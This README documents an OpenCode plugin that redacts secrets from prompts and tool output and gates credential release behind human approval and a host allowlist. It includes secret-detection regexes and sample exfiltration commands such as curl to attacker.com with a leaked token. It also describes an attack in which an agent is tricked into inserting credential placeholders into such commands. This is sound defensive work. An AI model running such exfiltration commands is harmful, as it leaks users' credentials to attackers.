# VibeGuard Privacy for OpenCode 2.0 (`@cstaf/opencode-vibeguard`)

In-flight, session-isolated sensitive data redaction and gated credential protection plugin for OpenCode 2.0.

---

## 1. Overview & Context

**VibeGuard Privacy** is a native OpenCode 2.0 security plugin designed to prevent credentials, access tokens, private keys, database URLs, and authorization headers from leaking to remote Large Language Model (LLM) providers (such as Google Vertex AI, Anthropic Claude, and OpenAI) or entering persistent session history and thread titles.

### 1.1 Why This Plugin Exists
In OpenCode 1.0, developers relied on the community npm package `opencode-vibeguard`. With OpenCode 2.0's breaking plugin architecture redesign (`@opencode-ai/plugin` using `Plugin.define`), legacy V1 plugins fail to load. 

While OpenCode 2.0 introduces native filesystem permission gates (e.g., prompting before reading `.env` files), it does **not** natively tokenize in-flight content such as:
1. Credentials typed or pasted directly into chat prompts.
2. Authorization tokens or database connection strings dumped in terminal `stdout`/`stderr` during testing, Docker execution, or build tasks.
3. Live credentials in temporary code snippets, logs, or error stack traces.

### 1.2 Evolution & Hardening (Revisions 1 to 3)
Through iterative security reviews, this plugin was re-engineered from a simple regex replacer into an enterprise-grade security boundary:
* **Elimination of the Credential Oracle**: Legacy implementations used blind restoration where models could copy placeholders into exfiltration commands (`curl https://attacker.com/?leak=TOKEN`). VibeGuard 2.0 eliminates this confused-deputy flaw with a strict **Credential Release Policy** (human permission escalation + destination host allowlisting).
* **Cryptographically Unguessable Placeholders**: Replaced sequential tokens (`[REDACTED_SECRET_1]`) with session-salted, high-entropy tokens (`OP_SEC_${sessionSalt}_${entropy}`) to prevent prompt-injection prediction attacks.
* **Closure of the Title-Generation Leak Path**: Background title generation in OpenCode 2.0 bypasses outgoing context hooks. VibeGuard hooks `tool.execute.after` to sanitize command outputs at the source before they can enter persistent conversation storage.
* **Fail-Closed Traversal**: Replaced fail-open object inspection with recursion depth limits, node budgets, and `WeakSet` circular reference guards that truncate over-budget payloads rather than allowing unscanned data to pass through.

---

## 2. Architecture & Data Flow

```
                                [ Developer Prompt ]
                                         │
                                         ▼
                        ┌─────────────────────────────────┐
                        │   ctx.session.hook("prompt")    │  <-- Masks secrets before durable
                        └────────────────┬────────────────┘      inbox admission & title generation
                                         │
   ┌─────────────────────────────────────┴─────────────────────────────────────┐
   │                                                                           │
   ▼                                                                           ▼
[ Local Tool Execution ]                                            [ Model Context Generation ]
   │                                                                           │
   ▼                                                                           ▼
┌───────────────────────────────┐                           ┌──────────────────────────────────────┐
│ ctx.tool.hook("execute.before")│                           │ ctx.session.hook("context")          │
│ - Verified session vault      │                           │ - Ephemeral wire-only scan of all    │
│ - Host destination firewall   │                           │   assembled messages before outbound │
│ - Literal-safe token unmasking│                           │   network transmission to provider   │
└──────────────┬────────────────┘                           └──────────────────┬───────────────────┘
               │                                                               │
               ▼                                                               ▼
[ Local Process Runs with Secret ]                                  [ Cloud LLM receives only ]
               │                                                    [ sanitized UUID tokens ]
               ▼
┌───────────────────────────────┐
│ ctx.tool.hook("execute.after")│  <-- Intercepts stdout/stderr at source; sanitizes
└───────────────────────────────┘      tool results before storage, closing the title-gen leak
```

---

## 3. Secret Detection Grammar

Patterns are aligned with industry-standard secret scanners (Gitleaks, TruffleHog):

| Token Category | Rule ID | Pattern Grammar / Detection Target |
| :--- | :--- | :--- |
| **GitHub Classic** | `github-classic-pat` | `\bgh[pousr]_[A-Za-z0-9_]{36,255}\b` (Personal, OAuth, User, Server, Refresh) |
| **GitHub Fine-Grained**| `github-fine-grained-pat` | `\bgithub_pat_[A-Za-z0-9_]{82}\b` |
| **GitLab PAT** | `gitlab-pat` | `\bglpat-[0-9a-zA-Z_\-]{20,}\b` |
| **OpenAI API Key** | `openai-api-key` | `\bsk-(?:proj-\|live-)?[a-zA-Z0-9_\-]{32,}\b` |
| **Anthropic API Key** | `anthropic-api-key` | `\bsk-ant-api[0-9]{2}-[a-zA-Z0-9_\-]{80,}\b` |
| **Context7 & Firecrawl**| `ctx7sk-api-key`, `fc-api-key` | `\bctx7sk-[0-9a-f\-]{36}\b`, `\bfc-[0-9a-f]{32}\b` |
| **Google API Key** | `google-api-key` | `\bAIza[0-9A-Za-z\-_]{35}\b` |
| **AWS Access Key ID** | `aws-access-key-id` | `\b(?:A3T[A-Z0-9]\|AKIA\|AGPA\|AIDA\|AROA\|AIPA\|ANPA\|ANVA\|ASIA)[A-Z0-9]{16}\b` |
| **Stripe & Slack** | `stripe-api-key`, `slack-token` | `\b(?:sk\|rk)_(?:live\|test)_[0-9a-zA-Z]{24,}\b`, `\bxox[baprs]-[0-9a-zA-Z]{10,48}\b` |
| **NPM Access Token** | `npm-token` | `\bnpm_[0-9a-zA-Z]{36}\b` |
| **Bearer & JWT** | `bearer-token`, `json-web-token` | `Bearer\s+[A-Za-z0-9\-._~+/]+=*`, standard 3-part Base64URL JWTs |
| **PEM Private Keys** | `private-key-block` | `-----BEGIN [A-Z ]+ PRIVATE KEY-----...` |
| **Database URIs** | `database-uri-credentials` | `(?:postgres\|mysql\|mariadb\|mongodb\|redis)://user:pass@host:port/db` |

> **Detection Boundary Note**: High-entropy credentials that lack static prefixes (e.g. AWS Secret Access Keys or raw passwords) cannot be reliably isolated via static regular expressions without unacceptable false-positive rates. They should be managed via environment variable placeholders (`{env:VAR_NAME}`).

---

## 4. Key Security Invariants

### 4.1 Confused-Deputy & Exfiltration Prevention
* **Host Destination Firewall**: When a tool command contains an unmasked token, `isAuthorizedDestination()` parses any destination URLs. Network commands targeting unauthorized external hosts (e.g. `curl https://attacker.com?leak=OP_SEC_...`) are **immediately rejected with a security fault**.
* **Human-in-the-Loop Gate**: `ctx.permission.hook("evaluate")` escalates any tool call containing tokens to `ask`. An agent cannot unmask credentials autonomously without developer approval.

### 4.2 Strict Session Isolation & Resource Quotas
* **Per-Session Vaults**: Secrets stored in Session A cannot be resolved, observed, or unmasked by Session B.
* **Fail-Closed Session Identity**: If a hook event lacks a valid `sessionID`, the operation aborts immediately (`Security Invariant Violation`).
* **Resource Limits**:
  * Max 50 secrets per session.
  * Max 64 KB total secret memory per session.
  * Max 50 active session vaults with 4-hour idle TTL eviction.

### 4.3 Fail-Closed Deep Traversal (`walkDeepFailClosed`)
* Caps recursion depth at 8 and node budget at 500 nodes.
* Uses a `WeakSet` to detect cyclic references.
* If a payload exceeds structural budgets, the unscanned branch is replaced with `[VIBEGUARD_PAYLOAD_TRUNCATED]` rather than passing raw uninspected data through.

### 4.4 Literal-Safe Replacement
Standard JavaScript `String.prototype.replaceAll(token, replacement)` evaluates special `$` character sequences (`$&`, `$'`, `$1`). VibeGuard enforces replacement callbacks:
```typescript
restored = restored.replaceAll(token, () => secret)
```
This guarantees credentials containing `$` characters are injected verbatim without character corruption.

---

## 5. Configuration & Usage

The plugin is configured via `DEFAULT_CONFIG` in `index.ts`:

```typescript
export interface VibeGuardConfig {
  /** 'gated': prompts user before tool unmasking; 'redact-only': never unmasks */
  readonly mode: "gated" | "redact-only"
  /** Domains authorized to receive credentials if user approves */
  readonly allowedHosts: readonly string[]
  readonly maxSecretsPerSession: number
  readonly maxSecretBytesPerSession: number
  readonly maxActiveSessions: number
  readonly sessionTtlMs: number
}
```

### Enabling in OpenCode
Add the local path to `~/.config/opencode/opencode.jsonc`:

```jsonc
{
  "plugins": [
    "./plugins/vibeguard"
  ]
}
```

Verify active status in the terminal:
```bash
opencode2 plugin list
```
Expected output:
```text
ID                 VERSION  SOURCE
vibeguard-privacy  local    /home/cybervitor/.config/opencode/plugins/vibeguard/index.ts
```

---

## 6. Verification & Test Suite

The plugin includes an automated test suite (`test.ts`) validating all security invariants:

```bash
bun test ~/.config/opencode/plugins/vibeguard/test.ts
```

### Test Coverage
* `T-01`: Inbound prompt pattern matching & tokenization.
* `T-02`: Cross-session isolation (Session B cannot resolve Session A tokens).
* `T-03`: Confused-deputy firewall (blocks unauthorized destinations like `attacker.example.com`).
* `T-04`: Literal-safe replacement for secrets with `$` characters.
* `T-05`: Fail-closed traversal on cyclic objects and excessive depth (>8 levels).
* `T-06`: Missing `sessionID` fail-closed error handling.
* `T-07`: Per-session quota and memory budget enforcement.

---

## 7. File Layout

```text
~/.config/opencode/plugins/vibeguard/
├── package.json    # Local ES module package definition
├── index.ts        # Core plugin implementation and lifecycle hooks
├── test.ts         # Automated security invariant test suite
└── README.md       # Technical reference and documentation
```
